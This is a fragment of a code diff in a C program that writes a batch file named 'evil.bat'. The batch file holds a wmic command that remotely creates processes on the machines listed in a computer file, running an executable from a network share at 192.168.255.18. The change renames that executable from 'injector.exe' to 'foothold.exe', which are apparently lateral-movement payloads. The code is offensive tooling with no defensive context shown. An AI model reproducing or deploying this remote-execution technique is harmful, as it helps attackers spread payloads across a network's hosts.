@@ -12,7 +12,7 @@ int main()
 {
 	const char* dirpath = "c:\\Users\\saurav\\Temp";
 	const char* filename = "c:\\Users\\saurav\\Temp\\evil.bat";
-    const char* filecontent = "wmic /node:@\'c:\\Users\\saurav\\Temp\\computer.txt\' process call create \'\\\\192.168.255.18\\c$\\Users\\saurav\\Desktop\\injector.exe\'";
+    const char* filecontent = "wmic /node:@\'c:\\Users\\saurav\\Temp\\computer.txt\' process call create \'\\\\192.168.255.18\\c$\\Users\\saurav\\Desktop\\foothold.exe\'";
 
 
 //Create Directory
